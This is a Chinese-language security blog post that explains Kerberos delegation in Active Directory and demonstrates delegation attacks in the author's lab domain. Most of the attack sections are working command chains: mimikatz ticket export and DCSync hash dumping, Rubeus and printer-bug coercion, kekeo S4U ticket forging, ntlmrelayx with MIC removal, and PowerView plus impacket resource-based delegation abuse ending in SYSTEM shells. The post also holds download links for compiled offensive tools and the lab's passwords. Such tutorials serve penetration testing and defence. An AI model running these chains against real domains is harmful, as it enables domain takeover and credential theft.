---
title: "Kerberos 域委派攻击"
slug: kerberos-domain-delegation-attack
url: /2022/kerberos-domain-delegation-attack.html
date: 2022-02-22T21:17:23+08:00
categories: ["网络安全"]
tags: ["委派", "域渗透", "Windows", "Kerberos", "NTLM Relay", "Pass The Ticket"]
toc: true
draft: false

---

在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 Kerberos 向 Web Server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“Kerberos 双跳问题”，并且要求进行委派，以便 Web Server 在修改数据库记录时模拟用户。Windows 2000 Server 发布的也是最初的非约束性委派。需要注意的一点是接受委派的用户只能是 `服务账户` 或者 `计算机用户` 。委派是域中的一种属性设置，是一个安全敏感的操作。是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务。

![image-20220212183512443](https://oss.zjun.info/zjun.info/202202121835778.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

如图，域用户 `zjun/user` 通过访问 Web 服务请求下载后台文件服务器中的文件，于是 Web 服务的服务账号 `webservice` 以域用户 `zjun/user` 的身份通过 Kerberos 认证协议或者其他身份认证协议的方式（其他身份认证协议可能存在于约束性委派或基于资源的约束性委派中，但域内基本上都是设置的仅使用 Kerberos 认证协议）请求后台文件服务器。这就是一个委派的流程。

委派主要分为以下三种：

* 非约束性委派 `UD: Unconstrained Delegation`
* 约束性委派 `CD: Constrained Delegation`
* 基于资源的约束性委派 `RBCD: Resource Based Constrained Delegation`

以下是本地操作环境：

* 域：`zjun.com`
* 域控：
  * 主域控：`P-DC` 系统：`Windows Server 2019` IP：`172.16.86.136`
  * 辅域控：`S-DC` 系统：`Windows Server 2016` IP：`172.16.86.135`
* 域内主机：
  * `Win-2008` IP：`172.16.86.133` 本地管理员：`user`
  * `Win-2012` IP：`172.16.86.134` 本地管理员：`user`
* 域用户：
  * 域管：`zjun\administrator`
  * 普通域用户：`zjun\admin`
  * 配置委派的域用户和服务账号：`zjun\test`

## 非约束性委派

服务账号可以获取被委派用户的 TGT，并将 TGT 缓存到 lsass 进程中，从而服务账号可使用该 TGT，模拟该用户访问域内其他服务。非约束委派的设置需要 SeEnableDelegationPrivilege 权限，该特权通常只有域管理员才有。

### 在域控上配置非约束性委派

**计算机用户**的非约束性委派配置：控制面板\系统和安全\管理工具\Active Directory 用户和计算机（%SystemRoot%\system32\dsa.msc）---> 域名/Computers/名称/属性 ---> 委派 ---> 信任此计算机来委派任何服务 (仅 Kerberos)(T)

![image-20220214121403951](https://oss.zjun.info/zjun.info/202202141214020.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

* 配置了非约束性委派属性的计算机用户的`userAccountControl`属性有个 Flag 位`WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION`，其对应的数是`0x81000=528384`。

  可在 Active Directory 用户和计算机窗口中开启查看的高级功能后选择对应机器名称属性中的属性编辑器中看到，如下图。

![image-20220214123601569](https://oss.zjun.info/zjun.info/202202141236066.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

**服务账号**的非约束性委派配置，可以先创建一个普通用户 `test`

```bash
net user test P@ssw0rd /add /domain
```

普通用户默认没有委派的选项设置，需要给他注册一个服务主体名称（SPN）使其成为一个服务账号

```bash
setspn -U -A priv/test test
```

也可以查找指定 `test` 用户注册的 SPN

```bash
setspn -L test
```

这时候 `test` 用户就拥有委派的属性，可以将其设置为非约束性委派

![image-20220214131758031](https://oss.zjun.info/zjun.info/202202141318082.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

* 配置了非约束性委派属性的服务账号的`userAccountControl`属性有个 Flag 位`NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION`， 其对应的数是`0x80200=524800`。

  可在 Active Directory 用户和计算机窗口中开启查看的高级功能后选择对应服务账户名称属性中的属性编辑器中看到，如下图

![image-20220214132209967](https://oss.zjun.info/zjun.info/202202141322167.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

### 查询非约束性委派的计算机或服务账号

默认域控是配置了非约束性委派的

#### PowerView

PowerView 有几个不同的版本，这里用的是 PowerShellEmpire 下的，脚本地址：<https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1>

```powershell
# 导入 PowerView 脚本
import-module .\powerview.ps1

# 查询域内非约束性委派的计算机
Get-NetComputer -Unconstrained -Domain zjun.com | select name

# 查询域内非约束性委派的服务账号
Get-NetUser -Unconstrained -Domain zjun.com | select name
```

#### Adfind

下载地址：<https://oss.zjun.info/file/AdFind.exe>

该工具不需要账号密码即可查询，其他支持 ldap 协议的工具也可以实现查询

```powershell
# 查询域内非约束性委派的计算机
AdFind.exe -b "DC=zjun,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn

# 查询非约束性委派的服务账号
AdFind.exe -b "DC=zjun,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

#### ldapsearch

kali 内置，其他系统安装

```bash
# Ubuntu 用户安装
sudo apt install ldap-utils

# mac 用户安装
brew install ldapvi
```

该工具需要域内任意用户的账号密码，可在域外查询。其他支持 ldap 协议的工具也可以实现查询。

查询域内非约束委派的计算机

```bash
ldapsearch -LLL -x -H ldap://172.16.86.136:389 -D "test@zjun.com" -w "P@ssw0rd"   -b dc=zjun,dc=com  "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

![image-20220214150609212](https://oss.zjun.info/zjun.info/202202141506468.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

查询非约束性委派的服务账号

```bash
ldapsearch -LLL -x -H ldap://172.16.86.136:389 -D "test@zjun.com" -w "P@ssw0rd"   -b dc=zjun,dc=com  "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

![image-20220214150643671](https://oss.zjun.info/zjun.info/202202141506972.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

### 非约束性委派攻击

用户 user 去访问服务 service，如果服务 service 的服务账户开启了非约束性委派，那么当用户 user 访问服务 service 的时候会将用户 user 的 TGT 发送给服务 service 并保存在内存中以备下次重用，所以服务 service 能够利用用户 user 的身份去访问用户 user 能够访问的任意服务。

两种攻击方式，一种是诱使域管用户（相当于是域内钓鱼）来访问配置了非约束性委派的主机或服务，二是结合打印机漏洞让域管用户强制回连以缓存 TGT。

#### 模拟域管访问非约束性委派主机

模拟域管用户 `zjun/Administrator`（只要是域管用户，不一定在域控）远程访问非约束性委派主机机 `Win-2008` ， `Win-2008` 已获得本地管理员权限。常见可利用钓鱼的连接方式可以是 MSSQL 或 IIS，这里演示域管用户 `zjun/Administrator` 直接 IPC 连接 `Win-2008` 。

`Win-2008` 无法访问域控 `P-DC.zjun.com`

```powershell
dir \\P-DC.zjun.com\c$
```

![image-20220215171830309](https://oss.zjun.info/zjun.info/202202151718682.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

域管用户 `zjun/Administrator` IPC 连接 `Win-2008`

```powershell
net use \\Win-2008.zjun.com /user:zjun\administrator P@ssw0rd2019
```

![image-20220215173931098](https://oss.zjun.info/zjun.info/202202151739592.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

这适合 `Win-2008` 机器就已经有了域管 `zjun/Administrator` 的 TGT 票据，可以用 mimikatz 导出

```powershell
# mimikatz
privilege::debug
sekurlsa::tickets /export
```

![image-20220215174214324](https://oss.zjun.info/zjun.info/202202151742777.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

然后通过 Pass The Ticket（PTT）将 TGT 注入到当前会话中

```powershell
# mimikatz
kerberos::ptt [0;7af73]-2-0-60a10000-Administrator@krbtgt-ZJUN.COM.kirbi

# DOS
dir \\P-DC.zjun.com\c$
```

![image-20220215174728134](https://oss.zjun.info/zjun.info/202202151747499.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

![image-20220215174903649](https://oss.zjun.info/zjun.info/202202151749581.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

#### 非约束性委派 +Spooler 打印机服务漏洞

利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification(Ex)` 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。

非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 `P-DC` 强制访问已控的具有本地管理员权限的非约束性委派机器 `Win-2008` ，从而拿到域管理员的 TGT，进而接管域控。

首先利用[Rubeus](https://github.com/GhostPack/Rubeus)在 `Win-2008` 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 `P-DC` 的登录信息

已编译的 Rubeus 下载：<https://oss.zjun.info/file/Rubeus.exe>

版本：<https://github.com/GhostPack/Rubeus/releases/tag/1.6.4>

```powershell
Rubeus.exe monitor /interval:1 /filteruser:P-DC$
```

![image-20220216131653076](https://oss.zjun.info/zjun.info/202202161317998.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

再利用[SpoolSample](https://github.com/leechristensen/SpoolSample)强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行

已编译的 SpoolSample 下载：<https://oss.zjun.info/file/SpoolSample.exe>

```powershell
SpoolSample.exe P-DC Win-2008
```

![image-20220216133229470](https://oss.zjun.info/zjun.info/202202161332753.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

同时 Rubeus 也获取到了来自域控 `P-DC` 的 TGT 票据

![image-20220216133347094](https://oss.zjun.info/zjun.info/202202161335453.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

Rubeus 导入获取到的 TGT 票据

```powershell
Rubeus.exe ptt /ticket:Base64EncodedTicket
```

![image-20220216135155599](https://oss.zjun.info/zjun.info/202202161351112.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

这时候管理员权限运行 mimikatz 就可以获取域内所有用户的 NTLM hash，内存中也有了域管的 TGT 也可以直接 PTT。

```powershell
mimikatz.exe "log" "lsadump::dcsync /all /csv" "exit"
```

![image-20220216135932598](https://oss.zjun.info/zjun.info/202202161359682.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

接下来解密 NTLM hash 后可以直接登录域控，解不开也可以利用 krbtgt 的 NTLM hash 用于做黄金票据权限维持，可以参考：<https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html#cl-8>

有了黄金票据也同样可以访问域控了，使用 WinRM 服务来远程连接域控命令执行。

```powershell
Enter-PSSession -ComputerName P-DC
```

## 约束性委派

由于非约束性委派的不安全性，微软在 Windows Server 2003 中引入了约束委派。区别在于不会直接把 TGT 给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。同时为了在 Kerberos 协议层面对约束性委派的支持， 微软扩展了两个子协议：

* S4U2Self `Service for User to Self`
* S4U2Proxy `Service for User to Proxy`

`S4U2Self` 可以代表自身请求针对其自身的 Kerberos 服务票据 `ST` ， `S4U2Proxy` 可以用上一步获得的可转发 ST 服务票据以用户的名义请求针对其他指定服务的 ST 服务票据。

对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的 `msDS- AllowedToDelegateTo` 属性会指定对哪个 SPN 进行委派。约束性委派的设置需要 SeEnableDelegationPrivilege 权限，该特权通常只有域管理员才有。

### 在域控上配置约束性委派

约束性委派有两种，然后添加可以由此账户提供委派凭证的服务即可：

* 仅使用 Kerberos(K)

* 使用任何身份验证协议 (N)

  下面设置了服务用户 `test` 的约束性委派，协议为域控 `P-DC` 的 `cifs` 协议

![image-20220216203007438](https://oss.zjun.info/zjun.info/202202162030918.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

#### 仅使用 Kerberos(K)

仅用 Kerberos 协议进行身份验证，不支持协议转换。置了仅使用 Kerberos(K) 约束性委派的机器账号和服务账号的 `userAccountControl` 属性与正常账号一样，但是其 `msDS- AllowedToDelegateTo` 属性会有允许被委派的服务的 SPN。

![image-20220216153800108](https://oss.zjun.info/zjun.info/202202161538248.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

#### 使用任何身份验证协议 (N)

支持协议的转换。

* 配置了使用任何身份验证协议 (N) 约束性委派的机器账号的`userAccountControl`属性有个 FLAG 位 `WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION`，其对应的数是`0x1001000=16781312`。并且其`msDS-AllowedToDelegateTo`属性会有允许被委派的服务的 SPN。

![image-20220216154517798](https://oss.zjun.info/zjun.info/202202201422243.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

![image-20220216154332701](https://oss.zjun.info/zjun.info/202202161543696.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

* 配置了使用任何身份验证协议 (N) 约束性委派的服务账号的`userAccountControl`属性有个 FLAG 位`NORMAL_ACCOUNT | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`，其对应的数是`0x1000200=16777728`。并且其`msDS-AllowedToDelegateTo`属性会有允许被委派的服务的 SPN。

![image-20220216155151431](https://oss.zjun.info/zjun.info/202202201422517.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

![image-20220216155317469](https://oss.zjun.info/zjun.info/202202201422985.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

### 查询约束性委派的计算机或服务账号

#### PowerView

PowerView 有几个不同的版本，这里用的是 PowerShellMafia 下的，脚本地址：<https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1>

```powershell
# 导入 PowerView 脚本
import-module .\PowerView.ps1

# 查询域内约束性委派的计算机
Get-DomainComputer -TrustedToAuth -Domain zjun.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | fl

# 查询域内非约束性委派的服务账号
Get-DomainUser -TrustedToAuth -Domain zjun.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | fl
```

#### Adfind

下载地址：<https://oss.zjun.info/file/AdFind.exe>

该工具不需要账号密码即可查询，其他支持 ldap 协议的工具也可以实现查询。

```powershell
# 查询域内约束性委派的计算机
AdFind.exe -b "DC=zjun,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" -dn

# 查询非束性委派的服务账号
AdFind.exe -b "DC=zjun,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" -dn
```

#### ldapsearch

kali 内置，其他系统安装

```bash
# Ubuntu 用户安装
sudo apt install ldap-utils

# mac 用户安装
brew install ldapvi
```

该工具需要域内任意用户的账号密码，可在域外查询。其他支持 ldap 协议的工具也可以实现查询。

```powershell
# 查询域内约束性委派的计算机
ldapsearch -x -H ldap://172.16.86.136:389 -D "test@zjun.com" -w "P@ssw0rd" -b dc=zjun,dc=com "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"

# 查询非束性委派的服务账号
ldapsearch -x -H ldap://172.16.86.136:389 -D "test@zjun.com" -w "P@ssw0rd" -b dc=zjun,dc=com "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
```

### 约束性委派攻击

服务用户只能获取某个用户（或主机）的服务的 ST，所以只能模拟用户访问特定的服务，是无法获取用户的 TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者 `NTLM Hash` ，我们就可以伪造 S4U 请求，进而伪装成服务用户以任意账户的权限申请访问指定服务的 ST。

已经知道服务用户明文的条件下，我们可以用[kekeo](https://github.com/gentilkiwi/kekeo)请求该用户的 TGT

```powershell
# kekeo
tgt::ask /user:test /domain:zjun.com /password:P@ssw0rd

# 得到服务用户 test 的 TGT: TGT_test@ZJUN.COM_krbtgt~zjun.com@ZJUN.COM.kirbi
```

![image-20220216200623322](https://oss.zjun.info/zjun.info/202202162006580.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

使用这张 TGT 通过伪造 S4U 请求以 `administrator` 用户身份请求访问 `P-DC CIFS` 的 ST

```powershell
# kekeo
tgs::s4u /tgt:TGT_test@ZJUN.COM_krbtgt~zjun.com@ZJUN.COM.kirbi /user:Administrator@zjun.com /service:cifs/P-DC.zjun.com

# S4U2self 的 ST1: TGS_Administrator@zjun.com@ZJUN.COM_test@ZJUN.COM.kirbi
# S4U2proxy 的 ST2: TGS_Administrator@zjun.com@ZJUN.COM_cifs~P-DC.zjun.com@ZJUN.COM.kirbi
```

![image-20220216203250259](https://oss.zjun.info/zjun.info/202202162032172.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

`S4U2Self` 获取到的 ST1 和 `S4U2Proxy` 获取到的域控 P-DC CIFS 服务的 ST2 会保存在当前目录下，然后用 mimikatz 将 ST2 导入当前会话，即可成功访问域控 `P-DC`

```powershell
# mimikatz
kerberos::ptt TGS_Administrator@zjun.com@ZJUN.COM_cifs~P-DC.zjun.com@ZJUN.COM.kirbi
```

![image-20220216210106299](https://oss.zjun.info/zjun.info/202202201426656.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

![image-20220216210137895](https://oss.zjun.info/zjun.info/202202201421194.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

如果不知道服务用户明文的情况下，kekeo 同样也支持使用 NTLM Hash，在请求服务用户的 TGT 那步直接把 `/password` 改成 `/NTLM` 即可

```powershell
# kekeo
tgt::ask /user:test /domain:zjun.com /NTLM:e19ccf75ee54e06b06a5907af13cef42
```

如果不知道服务用户的明文和 NTLM Hash，但是已有服务用户登陆的主机的本地管理员权限，可以用 mimikatz 直接从内存中把服务用户的 TGT 导出

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

![image-20220216211846338](https://oss.zjun.info/zjun.info/202202162118805.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

服务用户的 TGT 导出后，就可以通过伪造 S4U 请求以 `administrator` 用户身份请求访问 `P-DC CIFS` 的 ST

```powershell
# kekeo
tgs::s4u /tgt:[0;8f613]-2-0-40e10000-test@krbtgt-ZJUN.COM.kirbi /user:Administrator@zjun.com /service:cifs/P-DC.zjun.com
```

## 基于资源的约束性委派

如果约束性委派，必须拥有 `SeEnableDelegationPrivilege` 权限，该特权是敏感的，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012 中引入了基于资源的约束委派。基于资源的约束性委派不需要域管理员权限去设置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能在运行 Windows Server 2012 及以上的域控制器上配置，约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林。

### 约束性委派与基于资源的约束性委派配置差别

传统的约束委派是正向的，通过修改服务 A 的 `msDS-AllowedToDelegateTo` 属性，添加服务 B 的 SPN，设置约束委派对象（服务 B），服务 A 便可以模拟用户向域控制器请求访问服务 B 的 ST 服务票据。而基于资源的约束委派则是相反的，通过修改服务 B 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，添加服务 A 的 SID，从而达到让服务 A 模拟用户访问 B 资源的目的。

### 基于资源的约束性委派攻击

该攻击由国外安全研究员 Elad Shami 提出：<https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>

无论服务账号的 `UserAccountControl` 属性是否被设置为 `TrustedToAuthForDelegation` 值，服务自身都可以通过调用 S4U2Self 来为任意用户请求自身的服务票据。但是当没有设置该属性时，KDC 通过检查服务账号的 `TrustedToAuthForDelegation` 位和 `msDS-AllowedToDelegateTo` 这两个字段，发现没有被赋值，所以服务自身通过 S4U2Self 请求到的 ST 服务票据是不可转发的，因此不可转发的 ST 服务票据是无法通过 S4U2Proxy 转发到其他服务进行约束性委派认证的。但是在基于资源的约束委派过程中，不可转发的 ST 服务票据仍然可以通过 S4U2Proxy 转发到其他服务进行委派认证，并且最后服务还会返回一张可转发的 ST 服务票据。因此，如果我们能够在服务 B 上配置允许服务 A 的基于资源的约束性委派，那么就可以通过控制服务 A 使用 S4U2Self 向域控请求任意用户访问自身的服务票据，最后再使用 S4U2Proxy 转发此 ST 票据去请求访问服务 B 的可转发的 ST 服务票据，即可成功模拟任意用户访问服务 B 了。服务账号 A 可以以普通域用户的权限去创建。

通过利用基于资源的约束委派攻击，攻击者能够使普通域用户以域管理员身份访问远程计算机 CIFS 等服务，实现本地权限提升。但是仅仅是本地提权，并不能执行域管理员的其他操作。

#### 基于资源的约束性委派攻击的两个条件

* 拥有服务 A 的权限（这里我们只需要拥有一个普通的域账号权限即可，普通的域账户默认可以创建最多十个机器账号）
* 拥有在服务 B 上配置允许服务 A 的基于资源的约束委派的权限（即拥有修改服务 B 的 `msDS-AllowedToActOnBehalfOfOtherldentity` 属性的权限）

综上两个条件可以转换为拥有将机器 B 加入域的域用户的权限。因为将机器 B 加入域的域用户拥有修改 `msDS-AllowedToActOn BehalfOfOtherldentity` 属性的权限。

#### 基于资源的约束性委派结合 NTLM Relay 接管域控 (CVE-2019-1040)

先在 Win-2008 上利用普通域用户权限新建一个机器账号 `test1$` ，利用 powershell 脚本：<https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1>

```powershell
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount test1$

# 或者也可以利用：https://github.com/Kevin-Robertson/Sharpmad
# Powermad 的 C# 版本，都方便 CobaltStrike 内存加载
# 创建机器账号命令：Sharpmad.exe MAQ -Action new -MachineAccount test -MachinePassword password
```

![image-20220221211037929](https://oss.zjun.info/zjun.info/202202212110323.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

随意输入一个密码，例如：test，在域控 `P-DC` 上面可以看到已经创建成功

![image-20220221211134701](https://oss.zjun.info/zjun.info/202202212111407.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

绕过 NTLM MIC 校验 + 打印机漏洞 + NTLM Relay + 基于资源的约束性委派组合攻击，利用 [impacket](https://github.com/SecureAuthCorp/impacket) python 脚本绕过 NTLM MIC 校验进行监听，监听 IP `172.16.86.136` 是域控 `P-DC` 的 IP

```bash
python3 ntlmrelayx.py -t ldap://172.16.86.136 -smb2support --remove-mic --delegate-access --escalate-user test1$ -debug
```

![image-20220221211336944](https://oss.zjun.info/zjun.info/202202212113943.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

利用打印机漏洞，通过普通有效域账号 smb 连接辅域控 `S-DC` ，并触发 SpoolService 服务错误，辅域控将通过 smb 回连至攻击者主机

辅域控 `S-DC` IP： `172.16.86.135`

攻击者 IP： `172.16.142.51`

利用脚本：<https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py>

```bash
python3 printerbug.py zjun.com/test:P@ssw0rd@172.16.86.135 172.16.142.51
```

![image-20220221211418440](https://oss.zjun.info/zjun.info/202202212114783.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

成功触发， `test1$` 这个机器账号已经有了 `S-DC` 的了基于资源的约束性委派

![image-20220221211503568](https://oss.zjun.info/zjun.info/202202212115620.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

得到服务票据，并导入后通过 SMB 连接。需要提前在本地 `/etc/hosts` 文件中指定对应主机名的 IP，或者将 `/etc/resolv.conf` 文件中 DNS 服务器指定为域控

```bash
sudo python3 getST.py -spn cifs/S-DC.zjun.com zjun/test1\$:test -dc-ip 172.16.86.136 -impersonate administrator
 
export KRB5CCNAME=administrator.ccache

python3 smbexec.py -k -no-pass S-DC.zjun.com
```

![image-20220221214728373](https://oss.zjun.info/zjun.info/202202212147670.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

#### 基于资源的约束性委派进行本地提权

有两个场景：

* 如果拿到将机器加入域的账号的权限，则能够拿到通过该账号加入域的所有机器的 system 权限。

* 如果拿到了 Account Operators 组（账户操作组）内用户权限的话，则可以拿到除域控外所有机器的 system 权限。

##### 场景一

需要先查询将机器加入域的账号。可以利用：<https://github.com/Kevin-Robertson/Sharpmad>

已编译版下载：<https://oss.zjun.info/file/Sharpmad.exe>

```bash
Sharpmad.exe MAQ -Action GetCreator
```

![image-20220222184321662](https://oss.zjun.info/zjun.info/202202221843237.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

WIN-2008 和 WIN-2012 这两台机器是由普通域用户 test 加入域的，test 用户也不在本地管理员组中

![image-20220221224348553](https://oss.zjun.info/zjun.info/202202212316648.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

还是利用 [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) 脚本新建一个密码为 test 的机器账号 test2

```powershell
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount test2 -Password $(ConvertTo-SecureString "test" -AsPlainText -Force)
```

![image-20220222184604274](https://oss.zjun.info/zjun.info/202202221846076.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

已经成功创建，可以查看

```bash
net group "domain computers" /domain
```

![image-20220222184641335](https://oss.zjun.info/zjun.info/202202221846124.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

配置 test2 到 Win-2012 的基于资源的约束性委派，利用 [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) 修改 WIN-2012 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的值。需要添加的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的 value 是 `O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;test2 的 sid)` 组成的。test2 的 sid 通过 [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) 查询：

```powershell
import-module .\PowerView.ps1

Get-DomainComputer test2 | select objectSid

# objectsid
# ---------
# S-1-5-21-2335421620-514153290-2844484534-1121
```

即修改 value 的命令如下

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2335421620-514153290-2844484534-1121)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WIN-2012| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![image-20220222185744061](https://oss.zjun.info/zjun.info/202202221859772.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

其他相关命令

```powershell
# 验证是否成功添加
Get-DomainComputer Win-2012 -Properties msds-allowedtoactonbehalfofotheridentity

# 清除 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值
Set-DomainObject Win-2012 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose
```

配置完 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性之后就可以利用 impacket 通过基于资源的约束性委派去攻击目标主机了。提前在本地 `/etc/hosts` 文件中指定对应主机名的 IP，或者将 `/etc/resolv.conf` 文件中 DNS 服务器指定为域控。test2 为刚才创建的机器账号，其密码是 test。

```bash
sudo python3 getST.py -dc-ip P-DC.zjun.com zjun.com/test2\$:test -spn cifs/Win-2012.zjun.com -impersonate administrator

export KRB5CCNAME=administrator.ccache

python3 smbexec.py -no-pass -k Win-2012.zjun.com
```

![image-20220222185904762](https://oss.zjun.info/zjun.info/202202221859364.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

成功获得 Win-2012 system 权限。

##### 场景二

先利用 Adfind.exe 查询 Account Operators 组（账户操作组）的用户， `-h` 后是域控的 IP

```bash
Adfind.exe -h 172.16.86.136:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=zjun,DC=com member
```

![image-20220222195652035](https://oss.zjun.info/zjun.info/202202221956554.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

有一个 test 用户，而且 test 用户已拿下，那就可以拿下除域控外的所有主机权限。其余操作和上面场景一一致：创建一个机器账号并配置该机器账号到需要攻击主机的基于资源的约束性委派，然后利用 impacket 脚本或者 Rubeus 实现票据获取和攻击。

#### 利用基于资源的约束性委派打造变种黄金票据

